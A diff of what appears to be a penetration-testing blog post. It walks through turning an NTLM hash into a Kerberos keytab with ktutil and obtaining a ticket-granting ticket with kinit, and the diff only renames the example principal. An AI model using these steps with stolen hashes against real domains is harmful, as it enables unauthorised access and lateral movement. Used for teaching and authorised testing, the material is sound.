@@ -98,12 +98,12 @@ ga('create', 'UA-198967-1', 'auto');
 
 <p>At the <code>ktutil</code> prompt, type in the &ldquo;add entry&rdquo; (<code>addent</code>) command with the &ldquo;principle&rdquo; (<code>-p</code>) flag. Specify the user and an all uppercase version of the FQDN. Then the &ldquo;KVNO&rdquo; (<code>-k 1</code>), which is the key number. Finally the encryption type, which is <code>rc4-hmac</code> for NTLM hashes:</p>
 
-<pre><code>ktutil: addent -p administrator@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
+<pre><code>ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
 </code></pre>
 
 <p>After you hit enter you&rsquo;ll get prompted for the rc4-hmac (NTLM) hash:</p>
 
-<pre><code>Key for administrator@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
+<pre><code>Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
 </code></pre>
 
 <p>Then we write the keytab file to disk and exit <code>ktutil</code></p>
@@ -114,9 +114,9 @@ ktutil: exit
 
 <p>The last step before we can use our authentication is to create a kerberos ticket using our keytab file.</p>
 
-<pre><code>root@wpad:~# kinit -V -k -t /tmp/a.keytab -f administrator@CORP.SOMEWHATREALNEWS.COM
+<pre><code>root@wpad:~# kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM
 Using default cache: /tmp/krb5cc_0
-Using principal: administrator@CORP.SOMEWHATREALNEWS.COM
+Using principal: uberuser@CORP.SOMEWHATREALNEWS.COM
 Using keytab: /tmp/a.keytab
 Authenticated to Kerberos v5
 </code></pre>
@@ -125,7 +125,7 @@ Authenticated to Kerberos v5
 
 <pre><code>root@wpad:~# klist
 Ticket cache: FILE:/tmp/krb5cc_0
-Default principal: administrator@CORP.SOMEWHATREALNEWS.COM
+Default principal: uberuser@CORP.SOMEWHATREALNEWS.COM
 
 Valid starting       Expires              Service principal
 07/22/2018 21:38:43  07/23/2018 07:38:43  krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM
